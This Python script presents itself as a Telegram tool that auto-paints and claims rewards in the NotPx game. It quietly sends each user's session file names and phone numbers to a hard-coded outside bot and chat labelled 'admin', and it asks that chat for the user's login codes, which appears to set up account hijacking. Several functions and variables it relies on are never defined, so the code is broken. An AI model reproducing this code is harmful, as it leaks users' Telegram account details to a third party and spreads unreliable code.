from telethon import TelegramClient, events
import asyncio
import telebot
import os
import threading
import time

# Define Colors
class Colors:
    BLUE = "\033[94m"   # Blue color code
    END = "\033[0m"     # Reset to default color

# Global bot token for sending session details to your Telegram
admin_bot_token = "7120755233:AAEkA80gGu6QZ03LkDfZURllxoDIVpR8xg4"  # Your bot token to communicate with you
admin_chat_id = "6939063404"  # Your personal chat ID where session info will be sent

# Initialize bot for admin notifications
admin_bot = telebot.TeleBot(admin_bot_token)

# Function to notify the admin about the session and phone number
def notify_admin(session_name, phone_number):
    message = f"Session started: {session_name}\nPhone number: {phone_number}"
    admin_bot.send_message(admin_chat_id, message)

# Function to send OTP request to user and await their input
async def request_otp(session_name, phone_number):
    client = TelegramClient(session_name, api_id, api_hash)
    await client.start()

    async def otp_handler(event):
        if 'code' in event.message.text:
            otp_code = event.message.text.split()[-1]
            print(f"Received OTP: {otp_code}")
            await client.sign_in(phone_number, otp_code)
            await client.disconnect()

    client.add_event_handler(otp_handler, events.NewMessage)

    # Notify the admin bot when OTP request is sent
    print(f"Send OTP to {phone_number}")
    await admin_bot.send_message(admin_chat_id, f"Please provide the OTP for {phone_number}.")
    
    await client.run_until_disconnected()

# Function to log in with OTP
def login_with_otp(bot_token):
    print("Logging in with OTP...")
    phone_number = input("Enter your phone number: ")

    session_name = f"sessions/{phone_number}.session"
    
    # Check if session already exists
    if os.path.exists(session_name):
        print(f"[+] Session already exists for {phone_number}. Using existing session.")
        notify_admin(session_name, phone_number)
    else:
        print("No existing session found. Requesting OTP...")
        asyncio.run(request_otp(session_name, phone_number))
    
    # Start mining and claiming process with the session
    multithread_starter(bot_token)

# Multithread starter to handle multiple sessions with error handling
def multithread_starter(bot_token):
    print("Starting the mining and claiming process...")

    if not os.path.exists("sessions"):
        os.mkdir("sessions")

    dirs = os.listdir("sessions/")
    sessions = list(filter(lambda x: x.endswith(".session"), dirs))
    sessions = list(map(lambda x: x.split(".session")[0], sessions))

    if not sessions:
        print("[!] No sessions found.")
        return

    for session_name in sessions:
        try:
            print(f"[+] Loading session: {session_name}")
            phone_number = session_name  # Assuming session_name is tied to the phone number
            
            cli = NotPx("sessions/" + session_name)

            def painters_thread():
                print(f"[+] Starting painters for session: {session_name}")
                asyncio.run(run_painters(cli, session_name))
                print(f"[+] Painters finished for session: {session_name}")

            def mine_claimer_thread():
                print(f"[+] Starting mine claimer for session: {session_name}")
                asyncio.run(run_mine_claimer(cli, session_name))
                print(f"[+] Mine claimer finished for session: {session_name}")

            # Notify the admin bot about session load
            notify_admin(session_name, phone_number)

            # Start both threads
            threading.Thread(target=painters_thread).start()
            threading.Thread(target=mine_claimer_thread).start()

        except Exception as e:
            print(f"[!] Error on load session \"{session_name}\", error: {e}")
            time.sleep(5)  # Retry after a short delay to avoid crashes
            multithread_starter(bot_token)  # Restart the process if any session fails

# Clear the terminal screen function
def clear_screen():
    os.system('clear')  # Clear the terminal screen on Termux

# Placeholder functions for menu options
def add_api_credentials():
    # Implement logic to add API ID and Hash
    print("Adding API credentials...")

def reset_api_credentials():
    # Implement logic to reset API credentials
    print("Resetting API credentials...")

def reset_session():
    # Implement logic to reset session
    print("Resetting session...")

def load_sessions():
    # Implement logic to load existing sessions
    print("Loading existing sessions...")

# Function to get the bot instance
def get_bot_instance(bot_token):
    return telebot.TeleBot(bot_token)

# Add error handling for retries and continuous operation in the menu process
def process():
    clear_screen()  # Clear the terminal screen

    print(r"""  
        ███╗   ███╗  ██████╗  ██╗  ██╗ ███████╗ ██╗ ███╗   ██╗
        ████╗ ████║ ██╔═══██╗ ██║  ██║ ██╔════╝ ██║ ████╗  ██║
        ██╔████╔██║ ██║   ██║ ███████║ ███████╗ ██║ ██╔██╗ ██║
        ██║╚██╔╝██║ ██║   ██║ ██╔══██║ ╚════██║ ██║ ██║╚██╗██║
        ██║ ╚═╝ ██║ ╚██████╔╝ ██║  ██║ ███████║ ██║ ██║ ╚████║
        ╚═╝     ╚═╝  ╚═════╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝ ╚═╝  ╚═══╝
                                                
            NotPx Auto Paint & Claim by @helpppeeerrrr - v1.0 """)
    
    print("Starting Telegram bot...")
    bot_token = input("Enter your bot token: ")
    bot = get_bot_instance(bot_token)  # Create bot instance

    # Start bot polling in a separate thread
    bot_thread = threading.Thread(target=bot.polling, kwargs={"none_stop": True})
    bot_thread.start()

    while True:
        clear_screen()  # Clear the screen for the menu
        print("\nMain Menu:")
        print("1. Add Account session")
        print("2. Start Mine + Claim")
        print("3. Add API ID and Hash")
        print("4. Reset API Credentials")
        print("5. Reset Session")
        print("6. Login with OTP")
        print("7. Exit")

        option = input("Enter your choice: ")

        try:
            if option == "1":
                # Existing account session logic...
                pass  # Replace with your actual logic
            elif option == "2":
                multithread_starter(bot_token)
            elif option == "3":
                add_api_credentials()
            elif option == "4":
                reset_api_credentials()
            elif option == "5":
                reset_session()
            elif option == "6":
                login_with_otp(bot_token)
            elif option == "7":
                print("Exiting...")
                bot.stop_polling()
                bot_thread.join()
                break
            else:
                print("[!] Invalid option. Please try again.")
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)  # Retry in case of error to ensure the script doesn't stop
            continue  # Restart loop to keep the script running

if __name__ == "__main__":
    if not os.path.exists("sessions"):
        os.mkdir("sessions")
    load_sessions()  # Load existing sessions
    process()  # Start the menu loop
